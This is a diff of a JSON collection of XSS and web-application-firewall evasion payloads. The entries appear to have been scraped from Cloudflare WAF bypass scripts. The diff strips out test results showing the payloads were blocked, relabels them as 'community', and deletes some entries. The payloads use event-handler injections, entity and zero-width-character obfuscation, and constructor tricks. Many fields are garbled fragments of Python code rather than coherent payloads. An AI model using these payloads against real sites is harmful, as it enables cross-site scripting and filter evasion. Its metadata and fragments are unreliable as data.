@@ -1,7 +1,7 @@
 {
   "category": "other",
   "subcategory": "general",
-  "count": 357,
+  "count": 236,
   "payloads": [
     {
       "id": "other-0011",
@@ -11,11 +11,7 @@
       "description": "<svg payload=alert(1) onload=eval(this.getAttribute(\"payload",
       "technique": "direct_injection",
       "source_file": "waf_round96_portswigger.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0035",
@@ -25,11 +21,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0046",
@@ -39,11 +31,7 @@
       "description": "alert(1)', '>hover",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0047",
@@ -53,11 +41,7 @@
       "description": "print()', '>hover",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0049",
@@ -67,11 +51,7 @@
       "description": "prompt(1)',\n           'prompt`1`', 'confirm(1)', '(alert)(1)', 'print()', 'alert``',\n           '.1|alert``",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0054",
@@ -81,11 +61,7 @@
       "description": "&#00000041;",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0055",
@@ -95,11 +71,7 @@
       "description": "&#0041;",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0056",
@@ -109,11 +81,7 @@
       "description": "&#41;",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0057",
@@ -123,11 +91,7 @@
       "description": "&#x0000029;",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0058",
@@ -137,11 +101,7 @@
       "description": "&#x000029;",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0059",
@@ -151,11 +111,7 @@
       "description": "&#x0029;",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0060",
@@ -165,11 +121,7 @@
       "description": "&#x29;",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0061",
@@ -179,11 +131,7 @@
       "description": "&#0000000041",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0062",
@@ -193,11 +141,7 @@
       "description": "&#x0000029",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0063",
@@ -207,11 +151,7 @@
       "description": "&#00000000000000000041;",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0064",
@@ -221,67 +161,7 @@
       "description": "&#x00000000000000000029;",
       "technique": "direct_injection",
       "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0065",
-      "category": "other",
-      "subcategory": "general",
-      "payload": " on",
-      "description": " oNLy=1 on', 1) if ' on' in p else p,\n    # Fake on= prefix\n    lambda p: p.replace('<', '<",
-      "technique": "direct_injection",
-      "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0066",
-      "category": "other",
-      "subcategory": "general",
-      "payload": " on",
-      "description": " on= on', 1) if ' on' in p else p,\n    lambda p: p.replace(' on', ' onx=() on', 1) if ' on' in p else p,\n    # Slash obfuscation\n    lambda p: p.replace('<img', '<img//////', 1) if '<img' in p.lower() else p,\n    lambda p: p.replace('<svg', '<svg/', 1) if '<svg' in p.lower() else p,\n    # Entity encode parens\n    lambda p: p.replace('(1)', '&#40;1&#41;",
-      "technique": "encoding",
-      "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0067",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "(1)",
-      "description": "%26%230000000040;1%26%230000000041;",
-      "technique": "direct_injection",
-      "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0068",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "(1)",
-      "description": "/**/(1)",
-      "technique": "direct_injection",
-      "source_file": "waf_round91_research.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0084",
@@ -291,11 +171,7 @@
       "description": "attributeHtml",
       "technique": "direct_injection",
       "source_file": "waf_round40_ws_headers.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0085",
@@ -305,11 +181,7 @@
       "description": "attributeHtml",
       "technique": "direct_injection",
       "source_file": "waf_round40_ws_headers.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0087",
@@ -319,11 +191,7 @@
       "description": "attributeHtml",
       "technique": "direct_injection",
       "source_file": "waf_round40_ws_headers.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0088",
@@ -333,11 +201,7 @@
       "description": "attributeHtml",
       "technique": "direct_injection",
       "source_file": "waf_round40_ws_headers.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0089",
@@ -347,11 +211,7 @@
       "description": "attributeHtml",
       "technique": "direct_injection",
       "source_file": "waf_round40_ws_headers.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0090",
@@ -361,11 +221,7 @@
       "description": "attributeHtml",
       "technique": "direct_injection",
       "source_file": "waf_round40_ws_headers.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0099",
@@ -375,11 +231,7 @@
       "description": "sql\", \"syntax\", \"mysql\", \"postgresql\", \"sqlite\",\n                       \"exception\", \"traceback\", \"stack trace\", \"root:\", \"/etc/passwd\",\n                       \"internal server\", \"template\", \"jinja\", \"mako\", \"freemarker",
       "technique": "direct_injection",
       "source_file": "waf_round15_pivot.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0109",
@@ -389,11 +241,7 @@
       "description": "<img src=x onerror=alert(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0111",
@@ -403,11 +251,7 @@
       "description": "<img src=x ",
       "technique": "direct_injection",
       "source_file": "waf_round3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0114",
@@ -417,11 +261,7 @@
       "description": "{\"globalHtml\": \"<img src=x onerror=alert(1)>\"}',\n          content_type=\"application/json",
       "technique": "direct_injection",
       "source_file": "waf_round3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0116",
@@ -431,11 +271,7 @@
       "description": "<root><globalHtml>&lt;img src=x onerror=alert(1)&gt;</globalHtml></root>\",\n          content_type=\"application/xml",
       "technique": "direct_injection",
       "source_file": "waf_round3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0119",
@@ -445,11 +281,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round90_last.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0123",
@@ -459,11 +291,7 @@
       "description": "A",
       "technique": "direct_injection",
       "source_file": "waf_round30_largebody.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0136",
@@ -473,25 +301,7 @@
       "description": "'):\n                        print(f\"  {name:55s} HTTP {r.status_code} (val={val[:80]})",
       "technique": "direct_injection",
       "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0137",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "on{",
-      "description": "on`', 'on}",
-      "technique": "direct_injection",
-      "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0140",
@@ -501,11 +311,7 @@
       "description": "GET",
       "technique": "direct_injection",
       "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0141",
@@ -515,11 +321,7 @@
       "description": "GET",
       "technique": "direct_injection",
       "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0142",
@@ -529,11 +331,7 @@
       "description": "GET",
       "technique": "direct_injection",
       "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0143",
@@ -543,11 +341,7 @@
       "description": "GET",
       "technique": "direct_injection",
       "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0144",
@@ -557,11 +351,7 @@
       "description": "GET",
       "technique": "direct_injection",
       "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0145",
@@ -571,11 +361,7 @@
       "description": "GET",
       "technique": "direct_injection",
       "source_file": "waf_round46_reflect.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0154",
@@ -585,11 +371,7 @@
       "description": "g onloa',\n    'd=aler',\n    't(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round11.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0156",
@@ -599,11 +381,7 @@
       "description": "hexaphp-upper\": '<img src=ONERROR ONERROR=(alert)(\"test",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0157",
@@ -613,11 +391,7 @@
       "description": "hexaphp-input\": '<input OnFoCuS OnFoCuS=(alert)(\"test",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0159",
@@ -627,11 +401,7 @@
       "description": "<svg onx=() onload=(confirm)(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0160",
@@ -641,11 +411,7 @@
       "description": "<img ignored=() src=x onerror=prompt(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0161",
@@ -655,11 +421,7 @@
       "description": "<svg/on%20onload=alert(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0162",
@@ -669,11 +431,7 @@
       "description": "<img src=\"x\" oncut=alert(1)>",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0163",
@@ -683,11 +441,7 @@
       "description": "<BODY onload!#$%&()*~+-_.,:;?@[/|\\\\]^`=confirm()>",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0164",
@@ -697,11 +451,7 @@
       "description": "<svg onx=() onload=window.alert?.()>",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0165",
@@ -711,11 +461,7 @@
       "description": "<input OnFoCuS OnFoCuS=(alert)(1) autofocus>",
       "technique": "direct_injection",
       "source_file": "waf_round19_github.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0167",
@@ -725,11 +471,7 @@
       "description": "vbscript:alert(1)',\n]\n\n# In different HTML contexts\nfor proto in PROTOCOLS:\n    get(f'<a href=\"{proto}\">click</a>', label=\"proto-href",
       "technique": "direct_injection",
       "source_file": "waf_round97_portswigger2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0170",
@@ -739,11 +481,7 @@
       "description": "on= ', 'onx=() ', 'oNLy=1 ",
       "technique": "direct_injection",
       "source_file": "waf_round97_portswigger2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0173",
@@ -753,11 +491,7 @@
       "description": "ontoggle', ' open', '>",
       "technique": "direct_injection",
       "source_file": "waf_round97_portswigger2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0174",
@@ -767,39 +501,7 @@
       "description": "onfocus', '', ' autofocus>",
       "technique": "direct_injection",
       "source_file": "waf_round97_portswigger2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0175",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "body",
-      "description": "onload', '', '>",
-      "technique": "direct_injection",
-      "source_file": "waf_round97_portswigger2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0184",
-      "category": "other",
-      "subcategory": "general",
-      "payload": " on",
-      "description": " oNLy=1 on', 1) if ' on' in p else p,\n    lambda p: p.replace('alert(1)', 'top[28056684..toString(36)](1)",
-      "technique": "direct_injection",
-      "source_file": "waf_round88_advanced3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0185",
@@ -809,11 +511,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round88_advanced3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0187",
@@ -823,11 +521,7 @@
       "description": "/",
       "technique": "direct_injection",
       "source_file": "waf_round88_advanced3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0188",
@@ -837,11 +531,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round88_advanced3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0189",
@@ -851,11 +541,7 @@
       "description": "application/x-www-form-urlencoded",
       "technique": "encoding",
       "source_file": "waf_round88_advanced3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0191",
@@ -865,11 +551,7 @@
       "description": "https",
       "technique": "direct_injection",
       "source_file": "waf_round88_advanced3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0197",
@@ -879,11 +561,7 @@
       "description": "onerror', ' src=x', '>",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0198",
@@ -893,11 +571,7 @@
       "description": "onerror', ' src=x', '>",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0199",
@@ -907,11 +581,7 @@
       "description": "onerror', ' src=x default', '>",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0200",
@@ -921,11 +591,7 @@
       "description": "onfocus', '', ' autofocus>",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0201",
@@ -935,11 +601,7 @@
       "description": "onfocus', '', ' autofocus>",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0202",
@@ -949,11 +611,7 @@
       "description": "onfocus', ' tabindex=0', ' autofocus>",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0203",
@@ -963,11 +621,7 @@
       "description": "onmouseover', ' value=50', '>X</meter>",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0204",
@@ -977,11 +631,7 @@
       "description": "onmouseover', ' value=50', '>X</progress>",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0205",
@@ -991,25 +641,7 @@
       "description": "onfocus', ' tabindex=0', ' autofocus>X</output>",
       "technique": "direct_injection",
       "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0212",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "on ",
-      "description": "on= ', 'onx=() ', 'oNLy=1 ",
-      "technique": "direct_injection",
-      "source_file": "waf_round99_final.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0233",
@@ -1019,95 +651,7 @@
       "description": "on`load', 'on{error',\n                                             'on{focus', 'on`focus",
       "technique": "direct_injection",
       "source_file": "waf_round44_browser_quirk.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0250",
-      "category": "other",
-      "subcategory": "general",
-      "payload": ":path',f'/?{param}={enc}'),(':scheme",
-      "description": "https",
-      "technique": "direct_injection",
-      "source_file": "waf_round92_research2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0251",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "(1)",
-      "description": "&#40;1&#41;",
-      "technique": "direct_injection",
-      "source_file": "waf_round92_research2.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0256",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "body",
-      "description": "onload', '', '>",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0257",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "details",
-      "description": "ontoggle', ' open', '>",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0258",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "input",
-      "description": "onfocus', '', ' autofocus>",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0259",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "div",
-      "description": "onmouseover', '', '>X</div>",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0260",
@@ -1117,11 +661,7 @@
       "description": "onfocus', '', ' autofocus>",
       "technique": "direct_injection",
       "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0261",
@@ -1131,11 +671,7 @@
       "description": "onstart', '', '>",
       "technique": "direct_injection",
       "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0262",
@@ -1145,11 +681,7 @@
       "description": "onerror', '', '><source src=x>",
       "technique": "direct_injection",
       "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0263",
@@ -1159,11 +691,7 @@
       "description": "onerror', '', '><source src=x>",
       "technique": "direct_injection",
       "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0267",
@@ -1173,25 +701,7 @@
       "description": "Reflect.apply(alert,null,[1])',\n    '[].constructor.constructor(\"alert(1)",
       "technique": "direct_injection",
       "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0270",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "on ",
-      "description": "on= ",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0271",
@@ -1201,11 +711,7 @@
       "description": "self', 'top",
       "technique": "direct_injection",
       "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0277",
@@ -1215,11 +721,7 @@
       "description": "text/html', 'text/xml', 'application/xml',\n    'application/octet-stream', 'multipart/mixed',\n    'application/x-www-form-urlencoded; charset=utf-7',\n    'application/json; charset=utf-16',\n]\n\nfor ct in UNUSUAL_CTS:\n    for p in METHOD_PAYLOADS[:2]:\n        enc = urllib.parse.quote(p, safe='",
       "technique": "encoding",
       "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0282",
@@ -1229,53 +731,7 @@
       "description": "style', 'script', 'iframe",
       "technique": "direct_injection",
       "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0283",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "noembed",
-      "description": "style', 'script",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0284",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "noembed",
-      "description": "style",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
-    },
-    {
-      "id": "other-0285",
-      "category": "other",
-      "subcategory": "general",
-      "payload": "window",
-      "description": "self",
-      "technique": "direct_injection",
-      "source_file": "waf_round98_portswigger3.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0297",
@@ -1285,11 +741,7 @@
       "description": "after",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0303",
@@ -1299,11 +751,7 @@
       "description": "zws",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0304",
@@ -1313,11 +761,7 @@
       "description": "zwnj",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0305",
@@ -1327,11 +771,7 @@
       "description": "zwj",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0306",
@@ -1341,11 +781,7 @@
       "description": "wj",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0307",
@@ -1355,11 +791,7 @@
       "description": "bom",
       "technique": "direct_injection",
       "source_file": "waf_round21_tweak.py",
-      "tested_against": [
-        "cloudflare_waf"
-      ],
-      "success_rate": 0.0,
-      "blocked": true
+      "source": "community"
     },
     {
       "id": "other-0308",
@@ -1369,11 +801,7 @@
       "description": "cgj",
       "technique": "direct_injection",
